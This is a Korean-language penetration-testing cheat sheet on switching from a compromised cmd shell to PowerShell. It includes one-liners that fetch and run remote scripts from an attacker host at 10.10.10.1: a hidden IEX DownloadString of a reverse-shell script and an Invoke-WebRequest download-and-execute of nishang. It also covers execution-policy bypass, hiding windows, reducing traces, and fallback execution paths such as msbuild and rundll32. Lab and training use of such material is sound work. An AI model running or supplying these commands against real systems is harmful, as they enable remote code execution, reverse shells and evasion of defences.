# cmd에서 PowerShell로 전환

- powershell.exe — cmd 셸에서 PowerShell을 호출하는 명령. 인자 없이 실행하면 대화형 셸로 전환되고, -Command로 한 줄 실행, -ExecutionPolicy Bypass로 스크립트 실행 제한을 우회해 ps1 파일을 돌린다.
- cmd만 확보됐을 때 .NET 호출, Invoke-WebRequest, AD 모듈, Get-Content 파이프라인 같은 PowerShell 전용 기능이 필요할 때. 스크립트 파일을 내려받아 바로 실행할 때.
- Windows에 기본 내장. PowerShell 2.0 이상이면 -ExecutionPolicy Bypass가 동작하고 cmd에서 실행 권한만 있으면 된다.

## 대화형 전환

```cmd
powershell
powershell -ep bypass
```

- 인자 없이 powershell만 치면 즉시 대화형 PowerShell 프롬프트(PS C:\>)로 전환되고, exit로 cmd로 되돌아온다.
- `-ep bypass`(-ExecutionPolicy Bypass의 축약)는 스크립트 실행 정책을 우회하는 플래그로, ps1 파일 실행 앞에 붙이는 표준형이다.

## 한 줄 실행(one-liner)

```cmd
powershell -c "Get-Process | Select-Object -First 5"
powershell -c "(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon').DefaultUserName"
powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1/rev.ps1')"
```

- `-c`(-Command): 실행 후 cmd로 복귀하는 한 번성 실행이다.
- `-nop`(-NoProfile): 프로파일 로드를 생략해 속도를 높이고 흔적을 줄인다. `-w hidden`(-WindowStyle Hidden): 창을 숨긴다.
- `-enc`(-EncodedCommand): base64(UTF-16LE)로 인코딩한 명령을 넘겨 인용문 충돌을 피한다. Linux에서는 `iconv -f utf-8 -t utf-16le | base64 -w0`로 만든다.

## 스크립트 파일 실행

```cmd
powershell -ep bypass -f C:\Windows\Temp\winPEAS.ps1
powershell -ep bypass -c "& 'C:\Windows\Temp\script.ps1'"
```

- `-f`(-File): 스크립트 파일을 직접 실행한다. Restricted 정책 환경에서는 -ExecutionPolicy Bypass가 함께 있어야 실행된다.

## 실전 예시

```cmd
:: 파일 다운로드 후 실행까지 cmd에서 한 번에
powershell -ep bypass -c "IWR 'http://10.10.10.1/nishang.ps1' -OutFile C:\Windows\Temp\n.ps1; & C:\Windows\Temp\n.ps1"

:: 가벼운 포트 확인 one-liner
powershell -c "Test-NetConnection 10.10.10.10 -Port 445"
```

- IWR은 Invoke-WebRequest의 별칭이며, 다운로드와 실행을 -c 한 줄로 묶는 패턴이 가장 흔하다.

## 팁·트러블슈팅

1. 스크립트 실행을 사용할 수 없습니다 오류는 실행 정책이 Restricted라는 뜻으로, -ep bypass를 빼먹은 경우다.
2. powershell.exe 자체가 차단된 환경이면 pwsh(PowerShell 7) 존재 여부나 msbuild·rundll32 같은 대체 실행 경로를 확인한다.
3. 대화형 전환 후에는 프롬프트 접두사(PS C:\>)로 셸이 바뀌었는지 확인한다. cmd 문법(dir /s /b, findstr)은 대부분 동작하지만 파이프 동작과 별칭이 다르다.
